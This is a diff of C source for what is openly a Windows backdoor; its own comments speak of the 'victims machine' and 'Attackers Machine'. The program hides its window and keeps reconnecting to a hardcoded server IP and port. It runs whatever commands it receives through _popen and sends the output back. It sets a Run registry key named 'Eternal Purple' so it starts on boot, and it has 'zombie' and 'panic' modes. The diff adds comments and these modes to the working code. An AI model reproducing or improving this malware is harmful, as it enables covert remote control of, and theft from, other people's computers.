@@ -10,14 +10,23 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 
+//Function that sets variable to 0 Used to reinitialize buff and other arrays
 #define bzero(p, size) (void) memset ((p), 0, (size))
 
+
 int sock;
+unsigned short ServPort = 50005;//Server Port
+char *ServIP  = "192.168.174.129";//Server IP
+
+void zombie(){
+	closesocket(sock);
+}
 
 //BOOTRUN used to enable persistance on victims machine(autorun on boot)
 int bootRun(){
-	char err[128] = "Failed\n";
-	char suc[128] = "Created Persistance at \\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+	//Output Strings declaration
+	char err[128] = "Failed\n";//Error String
+	char suc[128] = "Created Persistance at \\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n";//Success output string
 	TCHAR szPath[MAX_PATH];
 	DWORD pathLen = 0;
 	
@@ -38,7 +47,7 @@ int bootRun(){
 	if(RegSetValueEx(NewVal, TEXT("Eternal Purple"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
 		RegCloseKey(NewVal);
 		send(sock, err, sizeof(err), 0);
-		return -1
+		return -1;
 	}
 	//If everything checks out fine Close the key and send success mesage to server
 	RegCloseKey(NewVal);
@@ -47,6 +56,8 @@ int bootRun(){
 }
 
 //STRCUT used for cd command
+//pre: String str is a char array containing string to cut, slice from is the position from wich we will cut, slice to is the position final character
+//post: Returns pointer to char array wich contains cut string
 char *
 str_cut(char str[], int slice_from, int slice_to){
 	if (str[0] == '\0') return NULL;
@@ -80,13 +91,13 @@ str_cut(char str[], int slice_from, int slice_to){
 	return buffer;
 }
 
-
+//Main Function wich is called
 void Shell(){ //Once connected execute custom commands or bash
 	char buffer[1024];
 	char container[1024];
 	char total_response[18384];
-	
-	while (1) {
+	int shell = 1;//If shell mode is enabled
+	while (shell == 1) {
  		 jump:
 		 bzero(buffer,1024);
 		 bzero(container, sizeof(container));
@@ -104,14 +115,23 @@ void Shell(){ //Once connected execute custom commands or bash
 		else if(strncmp("persist", buffer, 7) == 0){//Use "persist" to try enable boot run
 			bootRun();
 		}
-    		else {					//Else send raw data
-			FILE *fp;
-			fp = _popen(buffer, "r");
-			while(fgets(container,1024,fp) != NULL) {
+		else if(strncmp("zombie", buffer, 6) == 0){//Use "zombie" to background current session
+			char zomb[128] = "Zombie Mode Enabled \n";
+			send(sock, zomb, sizeof(zomb),0);
+			shell = 0;
+		}
+		else if(strncmp("panic", buffer, 5) == 0){//Use "panic" to clean up all tracks and terminate connection
+			char panic[128] = "Cleaning Up and Exiting ... \n";
+			send(sock, panic, sizeof(panic),0);
+		}
+    		else {	//Else send raw data
+			FILE *fp; //Create File descriptor
+			fp = _popen(buffer, "r"); // open a process and execute command from buffer (r = read)
+			while(fgets(container,1024,fp) != NULL) { //Fgets streams data from a variable to another one fp -> container. Get 1024B and  concatenate them into total_response .if there is still data in fp, repeat loop
 				strcat(total_response, container);
-        	}
-		send(sock, total_response, sizeof(total_response), 0);
-		fclose(fp);
+        		}
+			send(sock, total_response, sizeof(total_response), 0);//once total response is filled send the data to the Attackers Machine
+			fclose(fp);//Close file descriptor fd used to get command return
     		}
 	}
 }
@@ -124,11 +144,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	ShowWindow(stealth, 0);
 	//2) DEFINE NETWORKNG STUFF NEEDED (PORT & IP)
 	struct sockaddr_in ServAddr;
-	unsigned short ServPort;
-	char *ServIP;
+
 	WSADATA wsaData;
-	ServIP = "192.168.1.171";//Server IP
-	ServPort = 50005;//Server Port
 	if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0){
 		exit(1);//Error control
 	}
@@ -140,9 +157,12 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	//3) TRY TO CONNECT
 	start:
 	while( connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){
-		Sleep(10);
+		Sleep(30);
 		goto start;
 	}
-	//4) EXECUTE SHELL COMMANDS
+	//4)If connection was succesful  EXECUTE SHELL funciont (main functionalities) 
 	Shell();
+	//End of execution
+	goto start;
+
 }
